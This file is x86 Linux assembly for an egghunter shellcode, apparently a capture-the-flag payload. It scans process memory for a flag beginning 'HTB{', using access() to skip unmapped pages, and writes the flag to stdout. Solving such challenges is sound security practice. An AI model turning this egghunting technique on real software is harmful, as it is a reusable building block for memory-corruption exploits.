global _start


section .text


_start:
  push 0x3c                  ; set duration for arg1 of alarm()
  pop ebx
  push 0x1b                  ; alarm systemcall
  pop eax
  int 0x80
  mov edi, dword 0x7b425448  ; egg = "{BTH". Reverse due to little-endian
  mov edx, 0        ; set start address to search for the egg

next_page:
  or dx, 0xfff            ; dx=4095 ; 0x1000 - 1 (4095) ; Page sizes in Linux x86 = 4096

next_address:
  inc edx                 ; edx = 4096
  pusha                   ; push all of the current general purposes registers onto the stack
  xor ecx, ecx            ; clear arg2
  lea ebx, [edx + 0x4]    ; address to be validated for memory violation
  mov al, 0x21            ; access systemcall
  int 0x80
  cmp al, 0xf2            ; compare return value, bad address = EFAULT (0xf2)
  popa                    ; get all the registers back
  jz next_page            ; jump to next page if EFAULT occurs
  cmp [edx], edi          ; compare string to egg
  jnz next_address        ; jump to next address if NOT egg
  mov ecx, edx            ; assign address of flag (buffer) to arg2 of write()
  push 0x24               ; set length of flag to write = 0x24(36) at arg3
  pop edx
  push 0x1                ; set arg1 (fd) as 1 in write() which is stdout
  pop ebx
  mov al, 0x4             ; write systemcall
  int 0x80
